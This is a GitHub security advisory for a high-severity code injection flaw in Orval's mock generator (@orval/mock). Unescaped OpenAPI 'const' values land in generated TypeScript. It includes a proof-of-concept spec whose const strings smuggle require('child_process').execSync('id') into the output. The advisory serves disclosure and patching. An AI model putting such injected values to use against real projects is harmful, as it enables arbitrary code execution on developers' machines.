# [H] Orval Mock Generation Code Injection via const

## Summary
Severity: High
Advisory: GHSA-f456-rf33-4626
CVE: CVE-2026-24132
CWE: CWE-77, CWE-94
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-01-22
Source: https://github.com/advisories/GHSA-f456-rf33-4626
Type: github-advisory

## Affected
- npm: `@orval/mock` — affected >=0 <7.20.0
- npm: `@orval/mock` — affected >=8.0.0-rc.0 <8.0.3

## Details
I am reporting a code injection vulnerability in Orval’s mock generation pipeline affecting @orval/mock in both the 7.x and 8.x series. This issue is related in impact to the previously reported enum x-enumDescriptions (https://github.com/advisories/GHSA-h526-wf6g-67jv), but it affects a different code path in the faker-based mock generator rather than @orval/core.

The vulnerability allows untrusted OpenAPI specifications to inject arbitrary TypeScript/JavaScript into generated mock files via the const keyword on schema properties. These const values are interpolated into the mock scalar generator (getMockScalar in packages/mock/src/faker/getters/scalar.ts) without proper escaping or type-safe serialization, which results in attacker-controlled code being emitted into both interface definitions and faker/MSW handlers. I have confirmed that this occurs on orval@7.19.0 and orval@8.0.2 with mock: true, and that the generated mocks contain executable payloads such as require('child_process').execSync('id') in the output TypeScript.

```yaml
openapi: 3.1.0
info:
  title: Mock Const Injection PoC
  version: 1.0.0
paths:
  /test:
    get:
      operationId: getTests
      responses:
        '200':
          description: OK
          content:
            application/json:
              schema:
                $ref: '#/components/schemas/Tests'
components:
  schemas:
    Tests:
      type: object
      properties:
        EvilString:
          type: string
          const: "'); require('child_process').execSync('id'); //"
        EvilNumber:
          type: number
          const: "0); require('child_process').execSync('id'); //"
        SafeEnum:
          type: string
          enum: ["test"]

```

## References
- https://github.com/orval-labs/orval/security/advisories/GHSA-f456-rf33-4626
- https://nvd.nist.gov/vuln/detail/CVE-2026-24132
- https://github.com/orval-labs/orval/pull/2828
- https://github.com/orval-labs/orval/pull/2829
- https://github.com/orval-labs/orval/pull/2830
- https://github.com/orval-labs/orval/commit/44ca8c1f5f930a3e4cefb6b79b38bcde7f8532a5
- https://github.com/orval-labs/orval/commit/6d8ece07ccb80693ad43edabccb3957aceadcd06
- https://github.com/orval-labs/orval/commit/9b211cddc9f009f8a671e4ac5c6cb72cd8646b62
- https://github.com/orval-labs/orval
- https://github.com/orval-labs/orval/releases/tag/v7.20.0
- https://github.com/orval-labs/orval/releases/tag/v8.0.3
